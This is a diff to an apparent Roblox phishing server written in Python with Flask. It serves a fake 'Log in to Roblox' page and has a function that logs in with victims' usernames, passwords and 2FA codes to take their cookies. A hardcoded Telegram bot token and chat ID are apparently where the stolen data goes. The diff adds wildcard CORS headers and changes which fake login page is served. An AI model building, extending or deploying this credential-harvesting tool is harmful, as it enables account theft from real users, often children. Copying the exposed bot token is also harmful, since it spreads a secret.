@@ -14,6 +14,14 @@ import selenium.webdriver.support.ui as ui
 
 app = Flask(__name__)
 
+# Добавляем CORS заголовки
+@app.after_request
+def after_request(response):
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
+    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
+    return response
+
 TELEGRAM_BOT_TOKEN = '8358408245:AAFkdDlfXA0NPkEmvXmcdSoU_av2vzz-OmM'
 TELEGRAM_CHAT_ID = '-1002709349680'
 
@@ -582,11 +590,11 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
 
 @app.route('/')
 def login_page():
-    return app.send_static_file('Log in to Roblox.html')
+    return app.send_static_file('login-clean.html')
 
-@app.route('/login.html')
-def old_login_page():
-    return render_template('login.html')
+@app.route('/test')
+def test_page():
+    return jsonify({'status': 'ok', 'message': 'Сервер работает!'})
 
 @app.route('/login', methods=['POST'])
 def login():
